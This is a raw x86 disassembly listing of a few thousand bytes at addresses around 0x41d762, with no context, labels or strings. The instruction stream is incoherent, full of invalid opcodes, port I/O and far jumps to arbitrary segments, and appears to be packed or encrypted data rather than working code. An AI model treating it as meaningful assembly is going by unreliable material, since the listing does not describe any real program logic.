  41d762:	xchg   ebp,eax
  41d763:	jnp    0x41d797
  41d765:	adc    ch,BYTE PTR [ecx]
  41d767:	inc    ebx
  41d768:	nop
  41d769:	cmp    DWORD PTR [edi+ecx*1+0x3],0x9ce8785
  41d771:	mov    al,0xc0
  41d773:	aaa    
  41d774:	pusha  
  41d775:	xor    al,0xce
  41d777:	jae    0x41d759
  41d779:	aam    0x81
  41d77b:	ins    BYTE PTR es:[edi],dx
  41d77c:	stos   BYTE PTR es:[edi],al
  41d77d:	jae    0x41d793
  41d77f:	loopne 0x41d7cf
  41d781:	jnp    0x41d7f4
  41d783:	cmp    al,0x12
  41d785:	mov    edx,0xa1482cc7
  41d78a:	jle    0x41d7f8
  41d78c:	xor    al,0x3a
  41d78e:	outs   dx,DWORD PTR ds:[esi]
  41d78f:	xchg   BYTE PTR [ebp-0x65],cl
  41d792:	or     al,0xc1
  41d794:	out    dx,al
  41d795:	rcr    BYTE PTR [eax],cl
  41d797:	xor    eax,0x2862704c
  41d79c:	lds    eax,FWORD PTR [ebp+0x49]
  41d79f:	fs pop ecx
  41d7a1:	add    eax,0xec283476
  41d7a6:	inc    ebx
  41d7a7:	jp     0x41d800
  41d7a9:	jmp    0x4f25:0x58d50ab7
  41d7b0:	sub    dh,BYTE PTR [ecx-0x1a]
  41d7b3:	xlat   BYTE PTR ds:[ebx]
  41d7b4:	stos   DWORD PTR es:[edi],eax
  41d7b5:	ja     0x41d77f
  41d7b7:	lea    ecx,[ecx-0x6d]
  41d7ba:	or     DWORD PTR [edx-0x12b8687b],ebp
  41d7c0:	in     al,dx
  41d7c1:	or     BYTE PTR [edi+0x71],ch
  41d7c4:	xchg   ecx,eax
  41d7c5:	je     0x41d785
  41d7c7:	pop    ds
  41d7c8:	sbb    edi,DWORD PTR [edx+0x4d04b3fa]
  41d7ce:	sbb    al,0xcf
  41d7d0:	cmp    al,0x6a
  41d7d2:	(bad)  
  41d7d3:	lahf   
  41d7d4:	mov    eax,0x63fd5af5
  41d7d9:	jbe    0x41d788
  41d7db:	or     DWORD PTR [ebx-0x19],eax
  41d7de:	jg     0x41d7b5
  41d7e0:	pop    eax
  41d7e1:	lods   eax,DWORD PTR ds:[esi]
  41d7e2:	lods   eax,DWORD PTR ds:[esi]
  41d7e3:	sub    al,0x8d
  41d7e5:	xchg   edx,eax
  41d7e6:	mov    dh,0xb6
  41d7e8:	jg     0x41d788
  41d7ea:	and    BYTE PTR ds:0x61eaac6c,dl
  41d7f0:	es (bad) 
  41d7f2:	xchg   edx,eax
  41d7f3:	jno    0x41d7a6
  41d7f5:	mov    bh,0x69
  41d7f7:	dec    esi
  41d7f8:	stos   DWORD PTR es:[edi],eax
  41d7f9:	xor    BYTE PTR [ecx+0x23],dl
  41d7fc:	iret   
  41d7fd:	pusha  
  41d7fe:	push   esi
  41d7ff:	lods   eax,DWORD PTR ds:[esi]
  41d800:	push   esp
  41d801:	pop    eax
  41d802:	push   ss
  41d803:	xlat   BYTE PTR ds:[ebx]
  41d804:	cdq    
  41d805:	jbe    0x41d7a5
  41d807:	cwde   
  41d808:	gs call 0x81b:0x77ab1521
  41d810:	aas    
  41d811:	popw   es
  41d813:	sbb    dl,bl
  41d815:	jecxz  0x41d7a2
  41d817:	ror    DWORD PTR [edx-0x1acbd036],0x84
  41d81e:	test   eax,0x860e88c7
  41d823:	sub    ebx,DWORD PTR [edx]
  41d825:	jecxz  0x41d832
  41d827:	xchg   edx,eax
  41d828:	sub    eax,0xb9c79c20
  41d82d:	jne    0x41d81e
  41d82f:	scas   al,BYTE PTR es:[edi]
  41d830:	out    dx,al
  41d831:	push   0x45ea0495
  41d836:	imul   esp,DWORD PTR [eax-0x4556afd9],0x7facbca5
  41d840:	xchg   ebp,eax
  41d841:	mov    bl,0xa9
  41d843:	scas   al,BYTE PTR es:[edi]
  41d844:	xchg   edi,eax
  41d845:	jg     0x41d84b
  41d847:	pop    ds
  41d848:	lods   eax,DWORD PTR ds:[esi]
  41d849:	icebp  
  41d84a:	xchg   ecx,eax
  41d84b:	in     eax,dx
  41d84c:	mov    edi,esp
  41d84e:	cwde   
  41d84f:	jno    0x41d7f3
  41d851:	rol    edi,0x72
  41d854:	cmc    
  41d855:	dec    ecx
  41d856:	sahf   
  41d857:	dec    eax
  41d858:	enter  0x22f0,0xb7
  41d85c:	(bad)  
  41d85d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d85e:	pop    esi
  41d85f:	fs mov al,0xbf
  41d862:	inc    esp
  41d863:	pop    ds
  41d864:	sbb    BYTE PTR [edx+0x7601bda0],ah
  41d86a:	jmp    0x5b43:0x106b353a
  41d871:	scas   eax,DWORD PTR es:[edi]
  41d872:	int3   
  41d873:	(bad)  
  41d874:	cmc    
  41d875:	ja     0x41d819
  41d877:	xor    esi,DWORD PTR [ebx-0x157ca418]
  41d87d:	cmp    DWORD PTR [esi+0x1dc7fad9],0x30eabf02
  41d887:	int    0xf3
  41d889:	add    dl,bh
  41d88b:	fs loop 0x41d86a
  41d88e:	(bad)  
  41d88f:	dec    BYTE PTR [edi+0x49]
  41d892:	mov    edi,0x819f512
  41d897:	pop    edx
  41d898:	jns    0x41d8d4
  41d89a:	push   0xc28d380
  41d89f:	cmp    eax,0xc2b9968a
  41d8a4:	hlt    
  41d8a5:	loop   0x41d884
  41d8a7:	pop    edi
  41d8a8:	push   eax
  41d8a9:	xlat   BYTE PTR ds:[ebx]
  41d8aa:	scas   al,BYTE PTR es:[edi]
  41d8ab:	push   ds
  41d8ac:	adc    edi,DWORD PTR [edx]
  41d8ae:	mov    ebp,ds
  41d8b0:	and    DWORD PTR fs:[esi],0xffffff9e
  41d8b4:	pop    edx
  41d8b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8b6:	jb     0x41d8a1
  41d8b8:	and    DWORD PTR [edx+0x3d],0x8f0771ec
  41d8bf:	adc    edi,DWORD PTR [ebx]
  41d8c1:	std    
  41d8c2:	aaa    
  41d8c3:	bound  edi,QWORD PTR [ebx]
  41d8c5:	mov    esi,0xe7419366
  41d8ca:	dec    ebp
  41d8cb:	sbb    BYTE PTR [ebp+0x55],0x8e
  41d8cf:	mov    dl,0x2f
  41d8d1:	mov    ch,0xf4
  41d8d3:	jmp    0x75c63d67
  41d8d8:	lahf   
  41d8d9:	xor    eax,DWORD PTR [ecx-0x14]
  41d8dc:	mov    esi,0xb8081f54
  41d8e1:	in     eax,dx
  41d8e2:	outs   dx,DWORD PTR ds:[esi]
  41d8e3:	push   esp
  41d8e4:	jnp    0x41d949
  41d8e6:	repnz pusha 
  41d8e8:	mov    esi,0x600b7e44
  41d8ed:	mov    DWORD PTR [eax],esp
  41d8ef:	sub    eax,0xd7b1267a
  41d8f4:	in     eax,0xbd
  41d8f6:	and    BYTE PTR [edi+0x6e006ec3],ch
  41d8fc:	not    BYTE PTR [esp+ecx*2-0x3168be53]
  41d903:	inc    ebx
  41d904:	mov    esp,0xd30e1285
  41d909:	in     eax,dx
  41d90a:	js     0x41d91e
  41d90c:	xchg   ebx,eax
  41d90d:	xchg   edx,eax
  41d90e:	pop    ebx
  41d90f:	cli    
  41d910:	jbe    0x41d988
  41d912:	mov    al,BYTE PTR [esi+0x13]
  41d915:	cmp    BYTE PTR [ecx-0x54],dh
  41d918:	sub    bl,BYTE PTR [esi+0x4d]
  41d91b:	mov    al,0x78
  41d91d:	(bad)  
  41d91f:	cdq    
  41d920:	ret    
  41d921:	adc    cl,bh
  41d923:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d924:	cmp    ah,BYTE PTR [bp+di+0x10]
  41d928:	add    DWORD PTR [ecx],esi
  41d92a:	cmp    DWORD PTR [ebp+ebp*2-0xb],0xffffffa7
  41d92f:	push   edi
  41d930:	dec    eax
  41d931:	out    dx,al
  41d932:	dec    edi
  41d933:	jns    0x41d9ad
  41d935:	pop    ecx
  41d936:	xor    ebp,DWORD PTR [esp+eax*4-0x4b]
  41d93a:	mov    dl,0xcc
  41d93c:	dec    ecx
  41d93d:	int3   
  41d93e:	mov    esp,0x72965bac
  41d943:	inc    edx
  41d944:	scas   al,BYTE PTR es:[edi]
  41d945:	int    0x15
  41d947:	test   al,0x71
  41d949:	mov    ch,BYTE PTR [esp+ebx*2]
  41d94c:	push   0xffffffb2
  41d94e:	mov    bh,0x96
  41d950:	inc    edx
  41d951:	aam    0x24
  41d953:	ds xchg esi,eax
  41d955:	out    0x14,eax
  41d957:	mov    al,ds:0x5a6a8e65
  41d95c:	or     esi,DWORD PTR fs:[ebx+0x45]
  41d960:	popa   
  41d961:	fnsave [edx-0x564ace22]
  41d967:	ret    0xda81
  41d96a:	cmp    ecx,DWORD PTR [ebp-0x5b]
  41d96d:	lods   al,BYTE PTR ds:[esi]
  41d96e:	dec    edx
  41d96f:	inc    ecx
  41d970:	scas   eax,DWORD PTR es:[edi]
  41d971:	mov    dh,0xe9
  41d973:	adc    eax,0x1c682b4c
  41d978:	fwait
  41d979:	mov    ah,0x6b
  41d97b:	jmp    0x4fef6973
  41d980:	popf   
  41d981:	sub    ecx,DWORD PTR [eax+0xb]
  41d984:	dec    ebp
  41d985:	out    dx,eax
  41d986:	or     eax,0x46674211
  41d98b:	ja     0x41d9a1
  41d98d:	sub    bl,dl
  41d98f:	mov    WORD PTR [ebp+0x33b9a0b6],es
  41d995:	cmp    eax,0x370e825d
  41d99a:	int3   
  41d99b:	push   es
  41d99c:	push   ebx
  41d99d:	dec    ecx
  41d99e:	xlat   BYTE PTR ds:[ebx]
  41d99f:	or     al,0x75
  41d9a1:	or     BYTE PTR [edx],cl
  41d9a3:	icebp  
  41d9a4:	dec    edi
  41d9a5:	xchg   ebp,eax
  41d9a6:	mov    eax,0x85b6bfe7
  41d9ab:	push   ss
  41d9ac:	outs   dx,BYTE PTR ds:[esi]
  41d9ad:	nop
  41d9ae:	pushf  
  41d9af:	cmp    al,0x85
  41d9b1:	in     eax,0x8c
  41d9b3:	sub    eax,0xddb96ae4
  41d9b8:	push   esp
  41d9b9:	fbld   TBYTE PTR [ecx+0x2b]
  41d9bc:	je     0x41d9c0
  41d9be:	xor    al,al
  41d9c0:	fdiv   DWORD PTR [edi+0x62]
  41d9c3:	lods   al,BYTE PTR ds:[esi]
  41d9c4:	cwde   
  41d9c5:	inc    eax
  41d9c6:	or     al,0x47
  41d9c8:	pop    ecx
  41d9c9:	add    al,0xb7
  41d9cb:	out    0xba,al
  41d9cd:	inc    edx
  41d9ce:	call   0x3101:0x2ac0aad
  41d9d5:	js     0x41da4e
  41d9d7:	out    dx,al
  41d9d8:	mov    cl,0x2a
  41d9da:	pop    eax
  41d9db:	dec    edx
  41d9dc:	test   al,0x82
  41d9de:	in     al,dx
  41d9df:	mul    DWORD PTR [ebp-0x665b6bfc]
  41d9e5:	ins    DWORD PTR es:[edi],dx
  41d9e6:	jbe    0x41d9f9
  41d9e8:	sub    cl,BYTE PTR [edi]
  41d9ea:	and    DWORD PTR [ecx],esp
  41d9ec:	rol    edi,cl
  41d9ee:	imul   esp,DWORD PTR [ebx+0x52],0x9c842ee5
  41d9f5:	fadd   st,st(4)
  41d9f7:	push   esp
  41d9f8:	push   esp
  41d9f9:	mov    bh,0x33
  41d9fb:	fdiv   QWORD PTR [eax+ebx*1-0x64f44797]
  41da02:	(bad)  
  41da03:	xchg   edx,eax
  41da04:	dec    ebp
  41da05:	sbb    eax,0x43d59e14
  41da0a:	jg     0x41da4a
  41da0c:	jl     0x41da2d
  41da0e:	gs daa 
  41da10:	lods   al,BYTE PTR ds:[esi]
  41da11:	fst    QWORD PTR [ebp+0xdecbda7]
  41da17:	xchg   ebp,eax
  41da18:	(bad)  
  41da19:	aaa    
  41da1a:	mov    esp,esp
  41da1c:	ret    
  41da1d:	fdivrp st(0),st
  41da1f:	leave  
  41da20:	push   es
  41da21:	inc    ebp
  41da22:	mov    dl,BYTE PTR [ebp+0x13a6b10f]
  41da28:	out    0x7a,eax
  41da2a:	xchg   esi,eax
  41da2b:	loopne 0x41d9f2
  41da2d:	adc    DWORD PTR [edx-0x57],eax
  41da30:	test   al,0x2d
  41da32:	add    al,0x51
  41da34:	ins    BYTE PTR es:[edi],dx
  41da35:	jecxz  0x41da27
  41da37:	stos   DWORD PTR es:[edi],eax
  41da38:	out    dx,al
  41da39:	lahf   
  41da3a:	jmp    0xde9b23e1
  41da3f:	add    esp,DWORD PTR [edi-0x3]
  41da42:	ret    
  41da43:	xor    eax,0xbbc797e5
  41da48:	sub    eax,0xbcd8318f
  41da4d:	icebp  
  41da4e:	ror    edi,cl
  41da50:	ficom  WORD PTR [edx]
  41da52:	mov    dl,0xbe
  41da54:	xchg   ebp,eax
  41da55:	xchg   ecx,eax
  41da56:	leave  
  41da57:	jl     0x41da4f
  41da59:	mov    ds:0xa826056b,eax
  41da5e:	push   0xeef6622c
  41da63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da64:	test   BYTE PTR [ebx-0x8],dl
  41da67:	mov    al,BYTE PTR [ebx]
  41da69:	mul    DWORD PTR [edx-0x1322eb4a]
  41da6f:	or     dl,BYTE PTR [esi-0x14]
  41da72:	mov    gs,WORD PTR [eax]
  41da74:	push   cs
  41da75:	inc    esi
  41da76:	loope  0x41dab4
  41da78:	shl    BYTE PTR [edx+0x51],1
  41da7b:	jnp    0x41dad4
  41da7d:	mov    dh,0xf8
  41da7f:	mov    ch,0xa6
  41da81:	jbe    0x41dac1
  41da83:	mov    ds:0x3108631f,al
  41da88:	scas   al,BYTE PTR es:[edi]
  41da89:	add    BYTE PTR [ebx],bh
  41da8b:	outs   dx,BYTE PTR ds:[esi]
  41da8c:	je     0x41dab7
  41da8e:	jecxz  0x41da41
  41da90:	or     eax,0x24aab88c
  41da95:	pop    edx
  41da96:	fwait
  41da97:	push   es
  41da98:	add    ebp,DWORD PTR [edx]
  41da9a:	int    0xd3
  41da9c:	sbb    BYTE PTR [eax],0xb3
  41da9f:	sahf   
  41daa0:	mov    ah,BYTE PTR [esi+0x65e728ca]
  41daa6:	cli    
  41daa7:	mov    BYTE PTR [ecx+0x59995d7a],ch
  41daad:	lods   eax,DWORD PTR ds:[esi]
  41daae:	les    edi,FWORD PTR [edx+0x7f]
  41dab1:	lds    edx,FWORD PTR [eax-0x6aa8eb7b]
  41dab7:	and    edx,DWORD PTR [ebx+esi*1-0x55904ec5]
  41dabe:	ret    0xaf9d
  41dac1:	push   ds
  41dac2:	jno    0x41da78
  41dac4:	retf   0x6ed
  41dac7:	test   eax,0x8f327160
  41dacc:	cmp    eax,DWORD PTR [ebx-0x590cffea]
  41dad2:	mov    ds:0xc15d4083,al
  41dad7:	mov    ecx,0x3c26a548
  41dadc:	pop    eax
  41dadd:	pop    ss
  41dade:	jno    0x41da6f
  41dae0:	adc    BYTE PTR [esi],cl
  41dae2:	popf   
  41dae3:	add    ch,BYTE PTR [ebx]
  41dae5:	mov    dl,0xe
  41dae7:	test   al,0x4
  41dae9:	push   edx
  41daea:	mov    ds:0x6bcd2021,eax
  41daef:	push   es
  41daf0:	pusha  
  41daf1:	fs inc ecx
  41daf3:	not    BYTE PTR [eax]
  41daf5:	cld    
  41daf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41daf7:	mov    esi,DWORD PTR [edx+0x30]
  41dafa:	popa   
  41dafb:	cmp    ebp,esi
  41dafd:	mov    al,0x11
  41daff:	out    0xd4,al
  41db01:	cwde   
  41db02:	inc    ebx
  41db03:	cmova  ecx,DWORD PTR [ecx]
  41db06:	xor    DWORD PTR ds:0x7f17452e,ebx
  41db0c:	ds inc esp
  41db0e:	sahf   
  41db0f:	popf   
  41db10:	and    dl,bl
  41db12:	(bad)  
  41db13:	sub    ecx,DWORD PTR [edi]
  41db15:	push   ebp
  41db16:	cmp    edi,DWORD PTR [ebx]
  41db18:	int    0x24
  41db1a:	cwde   
  41db1b:	sti    
  41db1c:	into   
  41db1d:	out    0xc8,eax
  41db1f:	lods   al,BYTE PTR ds:[esi]
  41db21:	pop    esp
  41db22:	cmc    
  41db23:	mov    es,WORD PTR [edx+0x2efc7bc9]
  41db29:	aas    
  41db2a:	repnz enter 0x4d24,0x47
  41db2f:	shr    BYTE PTR [edi-0x55],1
  41db32:	add    eax,0x2152e837
  41db37:	mov    al,BYTE PTR [esi-0x7e5e0aa4]
  41db3d:	sub    ch,dl
  41db3f:	aaa    
  41db40:	inc    esi
  41db41:	aas    
  41db42:	(bad)  
  41db43:	pop    edx
  41db44:	das    
  41db45:	into   
  41db46:	(bad)  [ebx-0x35]
  41db49:	lods   eax,DWORD PTR ds:[esi]
  41db4a:	push   cs
  41db4b:	sub    ch,bh
  41db4d:	fwait
  41db4e:	push   esi
  41db4f:	test   eax,0x6040d72a
  41db55:	cvtdq2ps xmm5,xmm5
  41db58:	push   eax
  41db59:	test   eax,0xb581434a
  41db5e:	xor    dh,BYTE PTR [ecx-0x1ddf75da]
  41db64:	out    0x87,al
  41db66:	jecxz  0x41daf7
  41db68:	call   0x20a0a550
  41db6d:	pop    ebp
  41db6e:	mov    edi,0xe9a69434
  41db73:	add    ax,WORD PTR [ecx]
  41db76:	retf   
  41db77:	out    dx,eax
  41db78:	adc    eax,0x8f9b4e6b
  41db7d:	loop   0x41db39
  41db7f:	jecxz  0x41dbcc
  41db81:	imul   edx,DWORD PTR [edi+ebx*1],0x1c870954
  41db88:	into   
  41db89:	repz dec esi
  41db8b:	or     bl,BYTE PTR [ecx]
  41db8d:	and    edi,DWORD PTR [edi]
  41db8f:	in     al,dx
  41db90:	xchg   ebx,eax
  41db91:	aam    0x3c
  41db93:	fbld   TBYTE PTR [edx]
  41db95:	jbe    0x41db4c
  41db97:	mov    DWORD PTR [ebx],edi
  41db99:	adc    BYTE PTR [edi-0x1a],0xe0
  41db9d:	pushf  
  41db9e:	data16 aaa 
  41dba0:	fs test al,0x23
  41dba3:	cdq    
  41dba4:	ins    DWORD PTR es:[edi],dx
  41dba5:	cdq    
  41dba6:	push   esp
  41dba7:	xlat   BYTE PTR ds:[ebx]
  41dba8:	ja     0x41db3e
  41dbaa:	ss ret 
  41dbac:	pusha  
  41dbad:	xchg   BYTE PTR [ebx-0x228b9032],ch
  41dbb3:	lock pop edi
  41dbb5:	inc    esp
  41dbb6:	enter  0xc646,0x70
  41dbba:	mov    eax,0x5d7d62d3
  41dbbf:	pushf  
  41dbc0:	mov    BYTE PTR [esi+0x18f6c2b],dh
  41dbc6:	jge    0x41dc1b
  41dbc8:	jo     0x41db83
  41dbca:	into   
  41dbcb:	and    edx,esi
  41dbcd:	push   edx
  41dbce:	adc    eax,0x1f2914bb
  41dbd3:	jp     0x41dc4b
  41dbd5:	ins    BYTE PTR es:[edi],dx
  41dbd6:	(bad)  
  41dbd7:	mov    ch,0x8f
  41dbd9:	bnd jge 0x41dbcb
  41dbdc:	pushf  
  41dbdd:	in     al,0x33
  41dbdf:	das    
  41dbe0:	lahf   
  41dbe1:	xchg   ebp,eax
  41dbe2:	mov    eax,ds:0x9a5cf0b0
  41dbe7:	jns    0x41dc43
  41dbe9:	dec    esp
  41dbea:	xor    esi,0x26e11537
  41dbf0:	imul   ebp,DWORD PTR [ebp+0x68],0xffffff8c
  41dbf4:	adc    BYTE PTR [edx-0x7cf834f0],bh
  41dbfa:	out    dx,al
  41dbfb:	(bad)  
  41dbfd:	nop
  41dbfe:	loope  0x41dc52
  41dc00:	arpl   WORD PTR [ecx+ebp*8-0x421f324],cx
  41dc07:	aad    0x56
  41dc09:	fldln2 
  41dc0b:	adc    edi,DWORD PTR [ebp+eiz*2-0x7184047f]
  41dc12:	dec    eax
  41dc13:	(bad)  
  41dc14:	fs (bad) 
  41dc16:	popf   
  41dc17:	int3   
  41dc18:	clc    
  41dc19:	xchg   esi,eax
  41dc1a:	cmp    DWORD PTR [ecx],0xde2bf32a
  41dc20:	or     BYTE PTR [eax-0x6d3a4013],dh
  41dc26:	mov    bl,0xad
  41dc28:	pop    ss
  41dc29:	xchg   dh,ah
  41dc2b:	cmp    eax,0xe7e54720
  41dc30:	loopne 0x41dbde
  41dc32:	sbb    edi,ebx
  41dc34:	jnp    0x41dbf0
  41dc36:	test   BYTE PTR [esi+ebp*4],dl
  41dc39:	inc    ebx
  41dc3a:	ror    esp,1
  41dc3c:	fmul   DWORD PTR [esi-0x70]
  41dc3f:	daa    
  41dc40:	neg    al
  41dc42:	test   eax,0xef5a475b
  41dc47:	jae    0x41dbef
  41dc49:	adc    eax,0xa26643ec
  41dc4e:	leave  
  41dc4f:	cmp    edx,DWORD PTR [esi+ebx*8]
  41dc52:	mov    dl,0xcd
  41dc54:	sbb    edi,ebx
  41dc56:	push   ecx
  41dc57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc58:	addr16 push eax
  41dc5a:	cld    
  41dc5b:	fnsave [ecx+0x2983253d]
  41dc61:	stc    
  41dc62:	mov    edx,0x749a9e85
  41dc67:	mov    dh,0xe7
  41dc69:	add    DWORD PTR ss:[esi+0x3fa91df7],0xd
  41dc71:	push   ebx
  41dc72:	pushf  
  41dc73:	sbb    edx,esi
  41dc75:	and    al,0x76
  41dc77:	jo     0x41dbfd
  41dc79:	loope  0x41dcb6
  41dc7b:	loope  0x41dc03
  41dc7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc7e:	dec    edx
  41dc7f:	mov    bh,0xf8
  41dc81:	push   ecx
  41dc82:	xor    al,0x56
  41dc84:	dec    eax
  41dc85:	jo     0x41dcc0
  41dc87:	test   BYTE PTR [ebx+eiz*2],dl
  41dc8a:	out    0xb5,al
  41dc8c:	scas   eax,DWORD PTR es:[edi]
  41dc8d:	or     DWORD PTR [ebx],esp
  41dc8f:	popf   
  41dc90:	push   ss
  41dc91:	mov    ebx,ss
  41dc93:	into   
  41dc94:	mov    al,ds:0x84a83c3b
  41dc99:	jae    0x41dd14
  41dc9b:	popa   
  41dc9c:	push   eax
  41dc9d:	jb     0x41dd12
  41dc9f:	enter  0x29d6,0xc6
  41dca3:	daa    
  41dca4:	inc    edi
  41dca5:	sysenter 
  41dca7:	dec    eax
  41dca8:	inc    esi
  41dca9:	sbb    ebp,edx
  41dcab:	enter  0xaf14,0x95
  41dcaf:	das    
  41dcb0:	mov    WORD PTR [eax+0x74],fs
  41dcb3:	mov    bl,0x71
  41dcb5:	push   ebx
  41dcb6:	test   eax,0x1da34a69
  41dcbb:	fs dec esp
  41dcbd:	ficomp DWORD PTR [eax+0x3c4b962d]
  41dcc3:	mov    ebx,esi
  41dcc5:	xor    al,0x4b
  41dcc7:	mov    WORD PTR [ebx-0x66],ss
  41dcca:	(bad)  
  41dccb:	inc    eax
  41dccc:	dec    eax
  41dccd:	jno    0x41dc71
  41dccf:	sbb    ecx,eax
  41dcd1:	shr    BYTE PTR [eax+0x2acc185e],0xf4
  41dcd8:	adc    BYTE PTR [ebx-0xc5d44d5],0x9a
  41dcdf:	gs push esi
  41dce1:	cwde   
  41dce2:	mov    ecx,0xed5a0acf
  41dce7:	or     ebp,DWORD PTR [edi-0x7d]
  41dcea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dceb:	cdq    
  41dcec:	xor    BYTE PTR [edx+0x37],dh
  41dcef:	enter  0xd9c,0xed
  41dcf3:	dec    ebp
  41dcf4:	lock int3 
  41dcf6:	jl     0x41dcdf
  41dcf8:	iret   
  41dcf9:	mov    dl,BYTE PTR [ebx+esi*4]
  41dcfc:	leave  
  41dcfd:	sbb    bh,dl
  41dcff:	jno    0x41dc9f
  41dd01:	mov    dh,BYTE PTR [ebp+0x3bfc5c71]
  41dd07:	cdq    
  41dd08:	or     DWORD PTR [ecx-0x720a3982],ebx
  41dd0e:	rcr    BYTE PTR [ebx],1
  41dd10:	push   ebx
  41dd11:	data16 aaa 
  41dd13:	mov    eax,ds:0x22a79dce
  41dd18:	addr16 dec edi
  41dd1a:	push   eax
  41dd1b:	in     al,0x1e
  41dd1d:	test   DWORD PTR [edi+0x3c0f589f],edi
  41dd23:	xchg   BYTE PTR [ebx*2+0x66bd1149],bl
  41dd2a:	cdq    
  41dd2b:	je     0x41dcd0
  41dd2d:	inc    eax
  41dd2e:	push   ecx
  41dd30:	pop    eax
  41dd31:	mov    esp,0x820ca859
  41dd36:	stos   BYTE PTR es:[edi],al
  41dd37:	jmp    0xd7dd46d6
  41dd3c:	jmp    0xb39:0x5a303ecf
  41dd43:	out    dx,al
  41dd44:	ret    
  41dd45:	(bad)  [edx]
  41dd47:	and    al,0x3f
  41dd49:	jbe    0x41ddb7
  41dd4b:	jp     0x41dd19
  41dd4d:	pop    ebx
  41dd4e:	jge    0x41ddbd
  41dd50:	fiadd  WORD PTR [ecx+0x6be8de81]
  41dd56:	and    DWORD PTR [edi-0x1b],0xca764276
  41dd5d:	imul   ecx,edx,0xe764783b
  41dd63:	fcomp  st(7)
  41dd65:	adc    BYTE PTR [ebx+0x68],cl
  41dd68:	data16 (bad) 
  41dd6a:	std    
  41dd6b:	popa   
  41dd6c:	popa   
  41dd6d:	pusha  
  41dd6e:	je     0x41dd1d
  41dd70:	mov    dl,0x58
  41dd72:	adc    al,0xe2
  41dd74:	enter  0xf265,0x93
  41dd78:	jmp    0x933f3934
  41dd7d:	and    al,0xa9
  41dd7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd80:	dec    ebx
  41dd81:	adc    al,0x75
  41dd83:	mul    BYTE PTR [edx]
  41dd85:	int    0x40
  41dd87:	or     eax,0xf3e47163
  41dd8c:	fdivp  st(3),st
  41dd8e:	add    eax,0x4d042b8e
  41dd93:	push   esi
  41dd94:	add    dl,dl
  41dd96:	or     eax,0xf013d6f5
  41dd9b:	mov    ds:0xe4913462,al
  41dda0:	cmp    eax,0xfcae61cf
  41dda5:	ins    BYTE PTR es:[edi],dx
  41dda6:	cli    
  41dda7:	cmp    edi,ebp
  41dda9:	or     al,BYTE PTR [edx+ebp*4]
  41ddac:	popf   
  41ddad:	hlt    
  41ddae:	js     0x41dd45
  41ddb0:	cmp    BYTE PTR [esi+0x24],ah
  41ddb3:	and    BYTE PTR [edx-0x61],ah
  41ddb6:	mov    ebp,0xd75e6e79
  41ddbb:	shl    BYTE PTR [ebx+0x2],1
  41ddbe:	loop   0x41de35
  41ddc0:	adc    bh,bh
  41ddc2:	in     eax,0xa6
  41ddc4:	pusha  
  41ddc5:	xor    BYTE PTR [ebx],al
  41ddc7:	inc    edi
  41ddc8:	jmp    0x41dde6
  41ddca:	mov    esi,0xede494a2
  41ddcf:	jmp    0x5fe:0x3a80c245
  41ddd6:	push   esp
  41ddd7:	arpl   WORD PTR [eiz*8-0x6c1d5bad],si
  41ddde:	add    eax,0x6e86059d
  41dde3:	pop    es
  41dde4:	xor    eax,0x8454c7da
  41dde9:	xrelease xchg BYTE PTR [esi-0x9],ch
  41dded:	push   ebp
  41ddee:	jge    0x41ddd7
  41ddf0:	mov    esp,0x164d6b10
  41ddf5:	sbb    al,0xf5
  41ddf7:	cmp    al,0xfc
  41ddf9:	out    dx,al
  41ddfa:	jmp    0x282d:0x2c6e6785
  41de01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de02:	fmul   st(6),st
  41de04:	jb     0x41de07
  41de06:	cmp    al,0xc3
  41de08:	lock jbe 0x41de4e
  41de0b:	and    DWORD PTR [edx+0x3],esi
  41de0e:	repz cmp BYTE PTR [ebx],0x83
  41de12:	scas   al,BYTE PTR es:[edi]
  41de13:	or     al,0xa2
  41de15:	push   es
  41de16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de17:	jmp    0xec50502b
  41de1c:	xchg   ebp,eax
  41de1d:	jo     0x41de1e
  41de1f:	scas   eax,DWORD PTR es:[edi]
  41de20:	cmp    BYTE PTR [ecx],ah
  41de22:	inc    ebp
  41de23:	outs   dx,DWORD PTR ds:[esi]
  41de24:	loope  0x41de04
  41de26:	neg    BYTE PTR [ebx+0x24]
  41de29:	mov    eax,ds:0x628e60ba
  41de2e:	mov    eax,DWORD PTR [edi]
  41de30:	xlat   BYTE PTR ds:[ebx]
  41de31:	popa   
  41de32:	and    DWORD PTR [ebx+0x12ebd379],ebp
  41de38:	pop    esp
  41de39:	out    0x92,al
  41de3b:	inc    esp
  41de3c:	or     BYTE PTR [edx-0x30],bl
  41de3f:	(bad)  
  41de40:	popf   
  41de41:	(bad)  
  41de42:	in     al,dx
  41de43:	pop    ebx
  41de44:	jne    0x41deaf
  41de46:	mov    BYTE PTR [ebx+0x76],0xbe
  41de4a:	ss mov esp,eax
  41de4d:	call   0x1d8c:0xe617d1c2
  41de54:	push   cs
  41de55:	mov    bh,0xba
  41de58:	lods   al,BYTE PTR ds:[esi]
  41de59:	jl     0x41de90
  41de5b:	xchg   ebx,eax
  41de5c:	mov    esi,0xbbfebc27
  41de61:	shr    DWORD PTR [ebx+0x787b2fc0],0xee
  41de68:	adc    dh,BYTE PTR [edi-0x5d29087c]
  41de6e:	pop    edi
  41de6f:	sub    edx,DWORD PTR [eax+ebx*2-0x1c58819e]
  41de76:	scas   al,BYTE PTR es:[edi]
  41de77:	push   edx
  41de78:	(bad)  [ecx+0x7b1243f4]
  41de7e:	lea    ecx,[eax*2+0xb3467da]
  41de85:	xlat   BYTE PTR ds:[ebx]
  41de86:	mov    dh,0xf2
  41de88:	inc    ecx
  41de89:	xor    dh,bl
  41de8b:	jp     0x41dedf
  41de8d:	cmp    BYTE PTR [esi],dl
  41de8f:	adc    edx,ecx
  41de91:	dec    edx
  41de92:	or     al,0x89
  41de94:	adc    DWORD PTR [edi-0x464d470f],0x2fc4c668
  41de9e:	pop    ebx
  41de9f:	sti    
